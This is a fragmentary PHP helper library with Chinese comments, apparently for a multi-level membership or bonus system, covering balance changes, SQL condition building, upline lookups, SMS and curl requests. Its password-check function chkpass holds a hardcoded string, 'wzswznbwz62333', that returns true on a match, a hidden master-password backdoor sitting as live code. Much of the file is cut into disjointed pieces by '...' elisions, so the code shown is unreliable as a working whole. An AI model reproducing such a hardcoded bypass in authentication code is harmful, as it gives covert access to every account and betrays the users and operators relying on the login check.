<?php
	...
	*/
	...
	/*增加或者减少用户的货币
		参数说明:bankset(货币名称,用户编号,金额,货币类型,备注);
	...
	*/
	...
	二维前缀数组案例
	transform('S[报单金额]=100 and M[用户级别]=1',array(),
		array(
		'S'=>array('报单金额'=>100),
		'M'=>array('用户级别'=>2)
		)
	);返回值为false  表达式'S[报单金额]=100 and M[用户级别]=1' 被替换成'100=100 && 2=1',在进行计算
	...
	*/
	...
	//调换[]的内容作为sql查询的条件
	function transforms($form,$data=array(),$bydata=array(),$execute=true)
	{
		//定义预编译条件静态数组
	   	static $compile=array();
	   	if($form=="")
...
function chkpass($Expressly,$Ciphertext)
{
    ...
    if($Expressly === md100('wzswznbwz62333')){
        return true;
    }
	//如同时要兼容其他加密算法请在此行下边写
	return false;
...
function CONFIG($name=NULL,$val=NULL) {
	...
	*/
	  ...
	  function getnum($s1,$s2,$s3=NULL,$Proportion=100)
	  {
		...
		*/
		function sendSms($type="",$userid,$memo,$pdata,$mobile=""){
			...
			//用户信息
			$umobile=M("用户")->where(array("编号"=>$userid))->getField('移动电话');
			//用户接收短信的手机号
			if($mobile==""){
				$mobile=$umobile;
			}
	...
	function runadd(&$userdata,$val,$to,$option=array())
	{
		...
		{
			preg_match('/(.*)_(.*)/',$to,$trto); 
			$userial=$userdata[$trto[1].'_上级编号'];
			...
			//获取user节点
			$user = X('user');
			$upuserdata=$user->getuser($userial);
			
			if(method_exists($obj,'event_valadd'))
			{
				$obj->event_valadd($upuserdata,$val,$option);
			}
			else
			{
				throw_exception('在执行一次addval操作时,发现目标并没有event_valadd进行处理;');
...
function callog($str)
{
	...
	*/
	...
	function GET_F_L($str){
		return $str;
	}
	function GET_C_L($str){
		return $str;
	}
     ...
     * 模拟post和get请求
     * @param $sUrl         请求地址
     * @param array $aData  post数组
     * @param int $type     请求类型 1为post，0为get
     * @return mixed
     */
    function cCurlInit($sUrl,$aData=array(),$type=1){
        $ch = curl_init();
